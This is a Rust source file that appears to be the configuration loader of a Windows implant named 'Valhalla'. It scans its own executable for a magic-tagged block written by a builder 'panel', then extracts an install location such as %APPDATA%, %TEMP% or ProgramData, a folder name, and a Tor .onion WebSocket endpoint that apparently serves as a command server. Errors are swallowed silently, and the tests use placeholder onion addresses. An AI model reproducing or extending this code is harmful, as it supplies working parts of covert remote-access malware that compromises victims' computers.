use std::{fs, io, path::PathBuf};

use crate::transport::Endpoint;

// Layout of the configuration block embedded in the PE binary.
// The panel writes these bytes at the defined sentinel offsets.
//
// Magic sentinel (8 bytes): b"VLHCFG\x00\x01"
// Followed immediately by:
//   [0]     install_dir: u8       (0=Roaming, 1=Local, 2=Temp, 3=ProgramFiles, 4=ProgramData)
//   [1..2]  folder_name_len: u16 little-endian
//   [3..3+folder_name_len]  folder_name: UTF-8
//   then:   onion_len: u16 little-endian
//   then:   onion: UTF-8

const MAGIC: &[u8; 8] = b"VLHCFG\x00\x01";
const BLOCK_SEARCH_MAX: usize = 64 * 1024 * 1024; // only scan first 64 MiB

// Default values used when a config block cannot be located (development / test builds).
const DEFAULT_ONION: &str = "";
const DEFAULT_FOLDER: &str = "Valhalla";

#[derive(Clone, Debug)]
pub enum InstallDir {
    Roaming,       // 0 — %APPDATA%
    Local,         // 1 — %LOCALAPPDATA%
    Temp,          // 2 — %TEMP%
    ProgramFiles,  // 3 — %PROGRAMFILES%
    ProgramData,   // 4 — %PROGRAMDATA%
}

impl InstallDir {
    pub fn from_byte(b: u8) -> Self {
        match b {
            0 => Self::Roaming,
            1 => Self::Local,
            2 => Self::Temp,
            3 => Self::ProgramFiles,
            4 => Self::ProgramData,
            _ => Self::Local,
        }
    }

    pub fn resolve(&self) -> Option<PathBuf> {
        let var = match self {
            Self::Roaming      => "APPDATA",
            Self::Local        => "LOCALAPPDATA",
            Self::Temp         => "TEMP",
            Self::ProgramFiles => "PROGRAMFILES",
            Self::ProgramData  => "PROGRAMDATA",
        };
        std::env::var_os(var).map(PathBuf::from)
    }
}

pub struct Config {
    pub install_dir: InstallDir,
    pub folder_name: String,
    pub onion: String,
}

/// Read configuration from the running executable image.
/// Returns (Endpoint, display_string, InstallDir, folder_name).
pub(crate) fn load_config() -> Result<(Endpoint, String, InstallDir, String), String> {
    let exe = std::env::current_exe()
        .map_err(|_| String::new())?;
    let bytes = fs::read(&exe)
        .map_err(|_| String::new())?;

    let cfg = parse_config(&bytes).unwrap_or_else(|| Config {
        install_dir: InstallDir::Local,
        folder_name: DEFAULT_FOLDER.to_owned(),
        onion: DEFAULT_ONION.to_owned(),
    });

    if cfg.onion.is_empty() {
        return Err(String::new());
    }

    let endpoint = Endpoint::parse(&cfg.onion)
        .map_err(|_| String::new())?;
    let display = cfg.onion.clone();
    Ok((endpoint, display, cfg.install_dir, cfg.folder_name))
}

fn parse_config(bytes: &[u8]) -> Option<Config> {
    let scan_limit = bytes.len().min(BLOCK_SEARCH_MAX);
    let haystack = &bytes[..scan_limit];

    // Find magic sentinel.
    let pos = haystack.windows(MAGIC.len()).position(|w| w == MAGIC)?;
    let mut cursor = pos + MAGIC.len();

    let install_byte = *bytes.get(cursor)?;
    cursor += 1;
    let install_dir = InstallDir::from_byte(install_byte);

    let folder_len = read_u16_le(bytes, cursor)? as usize;
    cursor += 2;
    if folder_len > 260 { return None; }
    let folder_bytes = bytes.get(cursor..cursor + folder_len)?;
    let folder_name = std::str::from_utf8(folder_bytes).ok()?.to_owned();
    cursor += folder_len;

    let onion_len = read_u16_le(bytes, cursor)? as usize;
    cursor += 2;
    if onion_len > 512 { return None; }
    let onion_bytes = bytes.get(cursor..cursor + onion_len)?;
    let onion = std::str::from_utf8(onion_bytes).ok()?.trim().to_owned();

    Some(Config { install_dir, folder_name, onion })
}

fn read_u16_le(bytes: &[u8], pos: usize) -> Option<u16> {
    let lo = *bytes.get(pos)? as u16;
    let hi = *bytes.get(pos + 1)? as u16;
    Some(lo | (hi << 8))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_block(dir: u8, folder: &str, onion: &str) -> Vec<u8> {
        let mut v = MAGIC.to_vec();
        v.push(dir);
        let fb = folder.as_bytes();
        v.push(fb.len() as u8);
        v.push(0);
        v.extend_from_slice(fb);
        let ob = onion.as_bytes();
        v.push(ob.len() as u8);
        v.push(0);
        v.extend_from_slice(ob);
        v
    }

    #[test]
    fn parse_valid_block() {
        let block = make_block(1, "Valhalla", "ws://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.onion:443/");
        let cfg = parse_config(&block).expect("should parse");
        assert!(matches!(cfg.install_dir, InstallDir::Local));
        assert_eq!(cfg.folder_name, "Valhalla");
        assert!(cfg.onion.contains(".onion"));
    }

    #[test]
    fn parse_block_embedded_in_larger_payload() {
        let mut data = vec![0u8; 1024];
        let block = make_block(2, "Vikings", "ws://bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb.onion:443/valhalla");
        data[512..512 + block.len()].copy_from_slice(&block);
        let cfg = parse_config(&data).expect("should find block");
        assert!(matches!(cfg.install_dir, InstallDir::Temp));
        assert_eq!(cfg.folder_name, "Vikings");
    }

    #[test]
    fn empty_bytes_returns_none() {
        assert!(parse_config(&[]).is_none());
    }
}
